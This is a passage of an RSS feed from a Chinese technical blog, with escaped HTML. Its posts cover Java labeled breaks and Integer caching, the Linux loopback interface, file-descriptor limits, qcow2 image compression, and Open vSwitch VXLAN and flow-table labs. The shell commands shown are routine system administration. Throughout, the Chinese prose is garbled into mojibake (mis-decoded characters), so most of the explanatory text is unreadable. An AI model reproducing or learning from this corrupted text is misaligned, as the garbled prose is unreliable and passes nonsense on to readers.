&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;hello&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#ff79c6">if&lt;/span> (&lt;span style="color:#ff79c6">true&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#ff79c6">break&lt;/span> test; &lt;span style="color:#6272a4">// works&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;world&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">// è¾“å‡º&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>hello
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">test&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">try&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;hello&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#ff79c6">if&lt;/span> (&lt;span style="color:#ff79c6">true&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#ff79c6">break&lt;/span> test; &lt;span style="color:#6272a4">// works&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;world&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} &lt;span style="color:#ff79c6">finally&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">// è¾“å‡º&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>hello
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="integerçš„æ˜¯å¦ç›¸ç­‰é—®é¢˜">Integerçš„æ˜¯å¦ç›¸ç­‰é—®é¢˜&lt;/h3>
&lt;p>æ—¥å¸¸å¼€å‘ä½¿ç”¨åˆ°JavaåŸºæœ¬æ•°æ®ç±»å‹æ˜¯ä¸å¯é¿å…çš„ä¸€ä»¶äº‹ï¼Œä½†å®ƒå´åŒ…å«äº†ä¸€äº›å¾ˆå®¹æ˜“çŠ¯é”™çš„ç‚¹ï¼Œè¸©è¿‡ä¸€äº›å‘çš„åŒå­¦å¯èƒ½äº†è§£JavaåŸºæœ¬åŒ…è£…ç±»å‹çš„å¸¸é‡æ± æŠ€æœ¯ï¼Œä¾‹å¦‚&lt;code>Integer&lt;/code>å°±å…·æœ‰æ•°å€¼&lt;code>[-128ï¼Œ127] &lt;/code>çš„ç›¸åº”ç±»å‹çš„ç¼“å­˜æ•°æ®ï¼Œä½†ä¸‹é¢å®šä¹‰çš„4ä¸ªå˜é‡æ˜¯å¦ç›¸ç­‰ä½ æ˜¯å¦èƒ½è¯´çš„å‡ºæ¥å‘¢ï¼Ÿ&lt;/p></description></item><item><title>Linux ç¯å›ç½‘ç»œæ¥å£</title><link>https://www.typesafe.cn/posts/linux-loopback/</link><pubDate>Thu, 28 Jan 2021 22:59:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/linux-loopback/</guid><description>&lt;p>åœ¨å¼€å‘æˆ–è€…è°ƒè¯•æ—¶ï¼Œæˆ‘ä»¬ç»å¸¸éœ€è¦å’Œæœ¬åœ°çš„æœåŠ¡å™¨è¿›è¡Œé€šä¿¡ï¼Œä¾‹å¦‚å¯åŠ¨&lt;code>nginx&lt;/code>ä¹‹åï¼Œåœ¨æµè§ˆå™¨è¾“å…¥&lt;code>lcoalhost&lt;/code>æˆ–è€…&lt;code>127.0.0.1&lt;/code>å°±å¯ä»¥è®¿é—®åˆ°æœ¬æœºä¸Šé¢çš„&lt;code>http&lt;/code>æœåŠ¡ã€‚&lt;/p>
&lt;h2 id="linuxæ˜¯å¦‚ä½•è®¿é—®æœ¬æœºipçš„">Linuxæ˜¯å¦‚ä½•è®¿é—®æœ¬æœºIPçš„ï¼Ÿ&lt;/h2>
&lt;p>å¤§å¤šæ•°æ“ä½œç³»ç»Ÿéƒ½åœ¨ç½‘ç»œå±‚å®ç°äº†ç¯å›èƒ½åŠ›ï¼Œé€šå¸¸æ˜¯ä½¿ç”¨ä¸€ä¸ªè™šæ‹Ÿçš„ç¯å›ç½‘ç»œæ¥å£æ¥å®ç°ã€‚è¿™ä¸ªè™šæ‹Ÿçš„ç¯å›ç½‘ç»œæ¥å£çœ‹ç€åƒæ˜¯ä¸€ä¸ªçœŸå®çš„ç½‘å¡ï¼Œå®é™…ä¸Šæ˜¯æ“ä½œç³»ç»Ÿç”¨è½¯ä»¶æ¨¡æ‹Ÿçš„ï¼Œå®ƒå¯ä»¥é€šè¿‡&lt;code>TCP/IP&lt;/code>ä¸åŒä¸€å°ä¸»æœºä¸Šçš„å…¶ä»–æœåŠ¡è¿›è¡Œé€šä¿¡ï¼Œä»¥&lt;code>127&lt;/code>å¼€å¤´çš„&lt;code>IPv4&lt;/code>åœ°å€å°±æ˜¯ä¸ºå®ƒä¿ç•™çš„ï¼Œä¸»æµ&lt;code>Linux&lt;/code>æ“ä½œç³»ç»Ÿä¸ºç¯å›ç½‘å¡åˆ†é…çš„åœ°å€éƒ½æ˜¯&lt;code>127.0.0.1&lt;/code>ï¼Œä¸»æœºåæ˜¯&lt;code>localhost&lt;/code>ã€‚&lt;/p>
&lt;p>ç¯å›ç½‘ç»œæ¥å£ä¹‹æ‰€ä»¥è¢«ç§°ä¹‹ä¸ºç¯å›ç½‘ç»œæ¥å£ï¼Œæ˜¯å› ä¸ºä»æœ¬æœºå‘é€åˆ°æœ¬æœºä»»æ„ä¸€ä¸ªIPçš„æ•°æ®æŠ¥æ–‡éƒ½ä¼šåœ¨ç½‘ç»œå±‚äº¤ç»™ç¯å›ç½‘ç»œæ¥å£ï¼Œä¸å†ä¸‹å‘åˆ°æ•°æ®é“¾è·¯å±‚è¿›è¡Œå¤„ç†ï¼Œç¯å›ç½‘ç»œæ¥å£ç›´æ¥å‘é€å›ç½‘ç»œå±‚ï¼Œæœ€ç»ˆäº¤ç”±åº”ç”¨å±‚è½¯ä»¶ç¨‹åºè¿›è¡Œå¤„ç†ã€‚è¿™ç§æ–¹å¼å¯¹äºæ€§èƒ½æµ‹è¯•éå¸¸æœ‰ç”¨ï¼Œå› ä¸ºçœå»äº†ç¡¬ä»¶çš„å¼€é”€ï¼Œå¯ä»¥ç›´æ¥æµ‹è¯•åè®®æ ˆè½¯ä»¶æ‰€éœ€è¦çš„æ—¶é—´ã€‚&lt;/p>
&lt;p>é‚£ç¯å›ç½‘ç»œæ¥å£æ˜¯å¦‚ä½•åˆ¤æ–­ç›®çš„IPæ˜¯å¦ä¸ºæœ¬æœºåœ°å€çš„å‘¢ï¼Ÿ&lt;/p>
&lt;p>ç­”æ¡ˆå°±æ˜¯ç½‘ç»œå±‚åœ¨è¿›è¡Œè·¯ç”±è½¬å‘çš„æ—¶å€™ä¼šå…ˆæŸ¥æœ¬åœ°çš„è·¯ç”±è¡¨ï¼Œå‘ç°æ˜¯æœ¬æœºIPåäº¤ç»™ç¯å›ç½‘ç»œæ¥å£ã€‚æŸ¥çœ‹æœ¬åœ°è·¯ç”±è¡¨çš„å‘½ä»¤å¦‚ä¸‹ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>ip route show table &lt;span style="color:#8be9fd;font-style:italic">local&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¾“å‡ºå†…å®¹å¦‚ä¸‹ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>broadcast 10.141.128.0 dev eth0 proto kernel scope link src 10.141.155.131 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">local&lt;/span> 10.141.155.131 dev eth0 proto kernel scope host src 10.141.155.131 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>broadcast 10.141.191.255 dev eth0 proto kernel scope link src 10.141.155.131 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>broadcast 127.0.0.0 dev lo proto kernel scope link src 127.0.0.1 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">local&lt;/span> 127.0.0.0/8 dev lo proto kernel scope host src 127.0.0.1 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">local&lt;/span> 127.0.0.1 dev lo proto kernel scope host src 127.0.0.1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å…¶ä¸­&lt;code>local&lt;/code>å¼€å¤´çš„ä¾¿æ˜¯æœ¬åœ°IPï¼Œ&lt;code>dev&lt;/code>åé¢æ˜¯ç½‘å¡åç§°ã€‚&lt;/p></description></item><item><title>Linux ä¿®æ”¹æœ€å¤§æ–‡ä»¶æè¿°ç¬¦</title><link>https://www.typesafe.cn/posts/linux-limit/</link><pubDate>Mon, 11 Jan 2021 15:40:41 +0000</pubDate><guid>https://www.typesafe.cn/posts/linux-limit/</guid><description>&lt;pre tabindex="0">&lt;code>echo &amp;#34;fs.file-max=655350&amp;#34; &amp;gt;&amp;gt;/etc/sysctl.conf
echo &amp;#34;* soft nofile 655350&amp;#34; &amp;gt;&amp;gt; /etc/security/limits.conf
echo &amp;#34;* hard nofile 655350&amp;#34; &amp;gt;&amp;gt; /etc/security/limits.conf
ulimit -n 655350
&lt;/code>&lt;/pre></description></item><item><title>å‹ç¼©qcow2 é•œåƒæ–‡ä»¶</title><link>https://www.typesafe.cn/posts/qcow2-image-compression/</link><pubDate>Thu, 31 Dec 2020 00:00:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/qcow2-image-compression/</guid><description>&lt;h1 id="å‹ç¼©qcow2">å‹ç¼©qcow2&lt;/h1>
&lt;p>é¦–å…ˆï¼Œéœ€è¦å¯¹è™šæ‹Ÿæœºå‰©ä½™ç©ºé—´è¿›è¡Œå†™é›¶æ“ä½œï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code>dd if=/dev/zero of=/zero.dat
&lt;/code>&lt;/pre>&lt;p>åˆ é™¤ zero.datï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code>rm /zero.dat
&lt;/code>&lt;/pre>&lt;p>å…³é—­è™šæ‹Ÿæœºï¼Œæ‰§è¡Œ&lt;code>qemu-img&lt;/code>çš„&lt;code>convert&lt;/code>å‘½ä»¤è¿›è¡Œè½¬æ¢ï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code>qemu-img convert -c -O qcow2 /path/old.img.qcow2 /path/new.img.qcow2
&lt;/code>&lt;/pre></description></item><item><title>Open vSwitch å…¥é—¨å®è·µï¼ˆ6ï¼‰VXLANå®éªŒ</title><link>https://www.typesafe.cn/posts/ovs-learn-6/</link><pubDate>Wed, 30 Dec 2020 19:14:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/ovs-learn-6/</guid><description>&lt;h1 id="ä»€ä¹ˆæ˜¯vxlan">ä»€ä¹ˆæ˜¯VXLANï¼Ÿ&lt;/h1>
&lt;p>VXLANæ˜¯ä¸€ç§éš§é“å°è£…åè®®ï¼Œåœ¨ä¸‰å±‚ç½‘ç»œä¸Šå°è£…äºŒå±‚ç½‘ç»œæ•°æ®æŠ¥æ–‡ã€‚ç®€å•æ¥è¯´å°±æ˜¯å¯ä»¥åœ¨å·²ç»è§„åˆ’å¥½ç½‘ç»œæ‹“æ‰‘çš„è®¾å¤‡ä¸Šå°è£…å‡ºä¸€ä¸ªæ–°çš„äºŒå±‚ç½‘ç»œï¼Œå› æ­¤VXLANè¿™ç±»ç½‘ç»œåˆè¢«ç§°ä¹‹ä¸ºoverylayç½‘ç»œï¼Œåº•ä¸‹æ‰¿è½½VXLANç½‘ç»œçš„å°±è¢«ç§°ä¹‹ä¸ºunderlayç½‘ç»œã€‚&lt;/p>
&lt;h1 id="vxlanè§£å†³äº†ä»€ä¹ˆé—®é¢˜">VXLANè§£å†³äº†ä»€ä¹ˆé—®é¢˜ï¼Ÿ&lt;/h1>
&lt;p>æœ€è¿‘å‡ å¹´ï¼Œé˜¿é‡Œäº‘ï¼Œè…¾è®¯äº‘ï¼Œäº¬ä¸œäº‘ï¼Œåä¸ºäº‘ç­‰ç­‰å‚å•†æ¯åˆ°èŠ‚æ—¥éƒ½ä¼šæ‰“æŠ˜å‡ºå”®å¤§é‡äº‘æœåŠ¡å™¨ï¼Œ1æ ¸1Gå†…å­˜50Gç£ç›˜çš„æœåŠ¡å™¨å‡ åå—å°±èƒ½ä¹°åˆ°ä¸€å¹´çš„ä½¿ç”¨æƒï¼Œä½œä¸ºä¸€ä¸ªä¸“ä¸šçš„ç¾Šæ¯›å…šï¼Œå“ªä¸ªæ‰‹é‡Œæ²¡æœ‰å‡ å°å°ç ´æ°´ç®¡æœºå™¨ï¼Ÿä½†æ˜¯è¿™ä¹ˆå¤šçš„äº‘æœåŠ¡å™¨æ˜¯å‚å•†å¦‚ä½•åšéš”ç¦»çš„å‘¢ï¼Ÿäº†è§£è¿‡ç½‘ç»œçš„åŒå­¦æˆ–è®¸ä¼šè¯´VLANã€‚ä½†æ˜¯VLANè¿™ç§åªèƒ½éš”ç¦»4094ä¸ªè™šæ‹Ÿç½‘ç»œçš„æŠ€æœ¯åˆ«è¯´æ»¡è¶³ä¸äº†ç¾Šæ¯›å…šäº†ï¼Œå°±è¿æ­£å¸¸çš„ç”¨æˆ·ä¼°è®¡éƒ½æ’‘ä¸ä½ã€‚é‚£ä¸éš”ç¦»èƒ½è¡Œå—ï¼Œå‚å•†è§„åˆ’ä¸€ä¸ªç‰¹åˆ«å¤§çš„ç½‘æ®µï¼Œè®©å¤§å®¶éƒ½åœ¨è¿™é‡Œé¢è€ï¼Œæ­£å¸¸ç”¨æˆ·è¿˜å¥½ï¼Œä¸‡ä¸€è¿™ä¸ªæ—¶å€™è¿›æ¥ä¸€ä¸ªå¤§é»‘å®¢ï¼Œä¼°è®¡å°±ä¼šå…¨éƒ¨GGã€‚&lt;/p>
&lt;p>å› æ­¤ï¼Œéš”ç¦»æ˜¯å¿…ä¸å¯å°‘çš„ï¼Œå…¶ä¸­å…³é”®çš„æŠ€æœ¯å°±æ˜¯overlayç½‘ç»œã€‚&lt;/p>
&lt;p>é‚£VXLANå…·ä½“è§£å†³äº†å“ªäº›é—®é¢˜å‘¢ï¼Ÿ&lt;/p>
&lt;ul>
&lt;li>çªç ´äº†VLANæŠ€æœ¯4094ä¸ªéš”ç¦»ç½‘ç»œçš„é™åˆ¶ï¼Œåœ¨ä¸€ä¸ªç®¡ç†åŸŸä¸­åˆ›å»ºå¤šè¾¾1600ä¸‡ä¸ªVXLANç½‘ç»œã€‚&lt;/li>
&lt;li>VXLANæä¾›äº†äº‘æœåŠ¡å‚å•†æ‰€éœ€çš„è§„æ¨¡çš„ç½‘ç»œåˆ†æ®µï¼Œä»¥æ”¯æŒå¤§é‡ç§Ÿæˆ·ã€‚&lt;/li>
&lt;li>çªç ´äº†ç‰©ç†ç½‘ç»œè¾¹ç•Œçš„é™åˆ¶ï¼Œä¼ ç»Ÿè™šæ‹ŸäºŒå±‚ç½‘ç»œï¼ˆVLANï¼‰æ˜¯éœ€è¦å’Œç‰©ç†ç½‘ç»œåšå¤§é‡é€‚é…å·¥ä½œæ‰èƒ½ä¿è¯ç¯å¢ƒçš„è¿ç§»ä¸ä¼šå¯¼è‡´è™šæ‹Ÿç½‘ç»œå¼‚å¸¸ï¼Œoverlayç½‘ç»œåˆ™ä¸å¿…å…³å¿ƒåº•å±‚ç‰©ç†ç½‘ç»œæ˜¯å¦‚ä½•æ­å»ºçš„ï¼Œåªè¦èƒ½ä¿è¯VXLANç«¯ç‚¹ç›¸äº’ä¹‹é—´å¯ä»¥è”é€šå³å¯ã€‚&lt;/li>
&lt;/ul>
&lt;h1 id="vxlanç½‘ç»œå¦‚ä½•å·¥ä½œ">VXLANç½‘ç»œå¦‚ä½•å·¥ä½œï¼Ÿ&lt;/h1>
&lt;p>VXLANéš§é“åè®®å°†äºŒå±‚ä»¥å¤ªç½‘å¸§å°è£…åœ¨ä¸‰å±‚UDPæ•°æ®åŒ…ä¸­ï¼Œä½¿ç”¨æˆ·èƒ½å¤Ÿåˆ›å»ºè·¨ç‰©ç†ä¸‰å±‚ç½‘ç»œçš„è™šæ‹ŸåŒ–äºŒå±‚å­ç½‘æˆ–ç½‘æ®µã€‚æ¯ä¸ªäºŒå±‚å­ç½‘ä½¿ç”¨VXLANç½‘ç»œæ ‡è¯†ç¬¦ï¼ˆVNIï¼‰ä½œä¸ºå”¯ä¸€æ ‡è¯†ã€‚æŠ¥æ–‡æ ¼å¼å¦‚ä¸‹å›¾ï¼š&lt;/p>
&lt;p>&lt;img src="https://oss.typesafe.cn/vxlan_packet_header.png" alt="VXLANæŠ¥æ–‡æ ¼å¼">&lt;/p>
&lt;p>æ‰§è¡Œæ•°æ®åŒ…å°è£…å’Œè§£å°è£…çš„å®ä½“ç§°ä¸ºVXLANéš§é“ç»ˆç»“ç‚¹ï¼ˆVTEPï¼‰ã€‚VTEPä¸»è¦åˆ†ä¸ºä¸¤ç±»ï¼šç¡¬ä»¶VTEPå’Œè½¯ä»¶VTEPã€‚ç¡¬ä»¶VTEPæˆ‘æ¥è§¦è¾ƒå°‘ï¼Œè¿™é‡Œå°±ä¸å†ä»‹ç»äº†ã€‚&lt;/p>
&lt;p>è½¯ä»¶VTEPå¦‚ä¸‹å›¾æ‰€ç¤ºï¼šVTEPåœ¨æ•°æ®åŒ…åˆ°è¾¾è™šæ‹Ÿæœºä¹‹å‰è¿›è¡Œäº†å°è£…å’Œè§£å°è£…ï¼Œä½¿å¾—è™šæ‹Ÿæœºå®Œå…¨ä¸éœ€è¦çŸ¥é“VXLANéš§é“ä»¥åŠå®ƒä»¬ä¹‹é—´çš„ä¸‰å±‚ç½‘ç»œã€‚&lt;/p>
&lt;p>&lt;img src="https://oss.typesafe.cn/vxlan01.png" alt="vxlanç½‘ç»œ">&lt;/p>
&lt;h1 id="ç®€å•vxlanå®éªŒ">ç®€å•VXLANå®éªŒ&lt;/h1>
&lt;p>æˆ‘ä»¬å‚ç…§ä¸‹å›¾å®Œæˆå®éªŒã€‚&lt;/p>
&lt;p>&lt;img src="https://oss.typesafe.cn/vxlan_topo.png" alt="VXLANå®éªŒ">&lt;/p>
&lt;h3 id="ä¸»æœºa">ä¸»æœºA&lt;/h3>
&lt;pre tabindex="0">&lt;code># åˆ›å»ºéš§é“ç½‘æ¡¥
ovs-vsctl add-br br-tun
# åˆ›å»ºéš§é“ç«¯å£å¹¶æŒ‡å®šè¿œç«¯IPå’ŒVXLAN ID
ovs-vsctl add-port br-tun vx01 -- set Interface vx01 type=vxlan options:remote_ip=192.168.123.232 options:key=1111
# åˆ›å»ºå†…éƒ¨ç«¯å£
ovs-vsctl add-port br-tun vnet0 -- set Interface vnet0 type=internal
# åˆ›å»ºnetnsç”¨äºæ¨¡æ‹Ÿè™šæ‹Ÿç½‘ç»œè®¾å¤‡
ip netns add ns0
# å°†å†…éƒ¨ç«¯å£ç§»åŠ¨åˆ°netnsä¸­
ip link set vnet0 netns ns0
# å¯åŠ¨ç½‘å¡
ip netns exec ns0 ip link set lo up
ip netns exec ns0 ip link set vnet0 up
# é…ç½®IP
ip netns exec ns0 ip addr add 192.168.0.1/24 dev vnet0
&lt;/code>&lt;/pre>&lt;h3 id="ä¸»æœºb">ä¸»æœºB&lt;/h3>
&lt;pre tabindex="0">&lt;code># åˆ›å»ºéš§é“ç½‘æ¡¥
ovs-vsctl add-br br-tun
# åˆ›å»ºéš§é“ç«¯å£å¹¶æŒ‡å®šè¿œç«¯IPå’ŒVXLAN ID
ovs-vsctl add-port br-tun vx01 -- set Interface vx01 type=vxlan options:remote_ip=192.168.123.231 options:key=1111
# åˆ›å»ºå†…éƒ¨ç«¯å£
ovs-vsctl add-port br-tun vnet0 -- set Interface vnet0 type=internal
# åˆ›å»ºnetnsç”¨äºæ¨¡æ‹Ÿè™šæ‹Ÿç½‘ç»œè®¾å¤‡
ip netns add ns0
# å°†å†…éƒ¨ç«¯å£ç§»åŠ¨åˆ°netnsä¸­
ip link set vnet0 netns ns0
# å¯åŠ¨ç½‘å¡
ip netns exec ns0 ip link set lo up
ip netns exec ns0 ip link set vnet0 up
# é…ç½®IP
ip netns exec ns0 ip addr add 192.168.0.2/24 dev vnet0
&lt;/code>&lt;/pre>&lt;h2 id="æµ‹è¯•">æµ‹è¯•&lt;/h2>
&lt;p>åœ¨&lt;code>ä¸»æœºA&lt;/code>ä¸Šæµ‹è¯•ç½‘ç»œè¿é€šæ€§ &lt;code>ip netns exec ns0 ping 192.168.0.2&lt;/code>&lt;/p></description></item><item><title>Open vSwitch å…¥é—¨å®è·µï¼ˆ5ï¼‰OVS Flow Table æµè¡¨è§„åˆ™</title><link>https://www.typesafe.cn/posts/ovs-learn-5/</link><pubDate>Tue, 29 Dec 2020 18:38:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/ovs-learn-5/</guid><description>&lt;h1 id="openvswitch-flow-table-æµè¡¨">OpenvSwitch flow table æµè¡¨&lt;/h1>
&lt;blockquote>
&lt;p>OpenFlowï¼ˆOFï¼‰è¢«è®¤ä¸ºæ˜¯ç¬¬ä¸€ä¸ª&lt;a href="https://zh.wikipedia.org/wiki/%E8%BB%9F%E4%BB%B6%E5%AE%9A%E7%BE%A9%E7%B6%B2%E7%B5%A1">è½¯ä»¶å®šä¹‰ç½‘ç»œ&lt;/a>ï¼ˆSDNï¼‰æ ‡å‡†ä¹‹ä¸€ã€‚å®ƒæœ€åˆåœ¨SDNç¯å¢ƒä¸­å®šä¹‰äº†é€šä¿¡åè®®ï¼Œä½¿SDNæ§åˆ¶å™¨èƒ½å¤Ÿä¸ç‰©ç†å’Œè™šæ‹Ÿçš„äº¤æ¢æœºå’Œè·¯ç”±å™¨ç­‰ç½‘ç»œè®¾å¤‡çš„è½¬å‘å¹³é¢ç›´æ¥è¿›è¡Œäº¤äº’ï¼Œä»è€Œæ›´å¥½åœ°é€‚åº”ä¸æ–­å˜åŒ–çš„ä¸šåŠ¡éœ€æ±‚ã€‚&lt;/p>&lt;/blockquote>
&lt;p>å¦‚æœæŠŠOpenFlowæ§åˆ¶å™¨æ¯”ä½œâ€œå¤§è„‘â€ï¼ŒOVSæµè¡¨å°±åƒæ˜¯â€œå¤§è…¿â€ä¸€æ ·æ¥å—æ¥è‡ªâ€œå¤§è„‘â€çš„æŒ‡ä»¤ï¼Œå†³å®šè¦å‘å“ªä¸ªæ–¹å‘å‰è¿›ã€‚ä½†OVSæµè¡¨åŠŸèƒ½æ›´åŠ å¼ºå¤§ï¼Œåœ¨æ²¡æœ‰OpenFlowæ§åˆ¶å™¨æ—¶ï¼Œä¹Ÿå¯ä»¥è‡ªä¸»å·¥ä½œï¼Œå®ƒæœ¬èº«ä¹Ÿä¾›ä¸€äº›å‘½ä»¤è®©æˆ‘ä»¬å¯ä»¥ç›´æ¥ç®¡ç†æµè¡¨ã€‚&lt;/p>
&lt;h1 id="æ“ä½œå‘½ä»¤">æ“ä½œå‘½ä»¤&lt;/h1>
&lt;h3 id="æŸ¥çœ‹æµè¡¨è§„åˆ™">æŸ¥çœ‹æµè¡¨è§„åˆ™&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># æŸ¥çœ‹br-tunä¸Šçš„å…¨éƒ¨æµè¡¨è§„åˆ™&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-ofctl dump-flows br-tun
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="æ·»åŠ æˆ–ä¿®æ”¹æµè¡¨è§„åˆ™">æ·»åŠ æˆ–ä¿®æ”¹æµè¡¨è§„åˆ™&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ovs-ofctl addâˆ’flowï¼addâˆ’flowsï¼modâˆ’flows â€œæµè¡¨åŒ¹é…æ¡ä»¶,actions&lt;span style="color:#ff79c6">=[&lt;/span>åŠ¨ä½œ1&lt;span style="color:#ff79c6">][&lt;/span>,åŠ¨ä½œ2â€¦&lt;span style="color:#ff79c6">]&lt;/span>â€
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¦‚æœä½ æœ‰è¿‡ç¼–ç¨‹çš„ç»éªŒï¼Œæµè¡¨è§„åˆ™å…¶å®å°±æ˜¯ä¸€ä¸ªä¸ªç®€å•çš„&lt;code>if&lt;/code>è¯­å¥ï¼Œä¼ªä»£ç å¦‚ä¸‹ã€‚&lt;/p>
&lt;pre tabindex="0">&lt;code>if (æµè¡¨åŒ¹é…æ¡ä»¶){
	åŠ¨ä½œ1ï¼Œ
	åŠ¨ä½œ2...
}

if (æµè¡¨åŒ¹é…æ¡ä»¶){
	åŠ¨ä½œ1ï¼Œ
	åŠ¨ä½œ2...
}
&lt;/code>&lt;/pre>&lt;h3 id="åˆ é™¤æµè¡¨è§„åˆ™">åˆ é™¤æµè¡¨è§„åˆ™&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># åˆ é™¤br-tunä¸Šçš„å…¨éƒ¨æµè¡¨è§„åˆ™&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-ofctl del-flows br-tun
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># åˆ é™¤br-tunä¸ŠåŒ¹é…xxçš„å…¨éƒ¨æµè¡¨è§„åˆ™&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-ofctl del-flows br-tun xx 
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="æµè¡¨åŒ¹é…æ¡ä»¶">æµè¡¨åŒ¹é…æ¡ä»¶&lt;/h1>
&lt;p>OVS æµè¡¨åŒ¹é…æ¡ä»¶è¾ƒå¤šï¼Œä¸‹é¢æˆ‘å°†å…¶åˆ†æˆå››éƒ¨åˆ†æ¥è¯´æ˜ï¼Œåˆ†åˆ«æ˜¯:&lt;/p>
&lt;ul>
&lt;li>OVSåŒ¹é…æ¡ä»¶&lt;/li>
&lt;li>OSIæ¨¡å‹ç¬¬äºŒå±‚ã€æ•°æ®é“¾è·¯å±‚ã€‘&lt;/li>
&lt;li>OSIæ¨¡å‹ç¬¬ä¸‰å±‚ã€ç½‘ç»œå±‚ã€‘&lt;/li>
&lt;li>OSIæ¨¡å‹ç¬¬å››å±‚ã€ä¼ è¾“å±‚ã€‘&lt;/li>
&lt;/ul>
&lt;h2 id="ovsåŒ¹é…æ¡ä»¶">OVSåŒ¹é…æ¡ä»¶&lt;/h2>
&lt;h3 id="in_portport">in_port=port&lt;/h3>
&lt;p>æµé‡è¿›å…¥çš„ç«¯å£ç¼–å·æˆ–è€…åç§°ï¼Œç¤ºä¾‹ &lt;code>in_port=br-int&lt;/code>&lt;/p>
&lt;h3 id="tablenumber">table=number&lt;/h3>
&lt;p>è§„åˆ™ä¿å­˜çš„æµè¡¨ç¼–å·ï¼ŒèŒƒå›´æ˜¯ 0-254ï¼Œé»˜è®¤å€¼ï¼š0ã€‚&lt;/p>
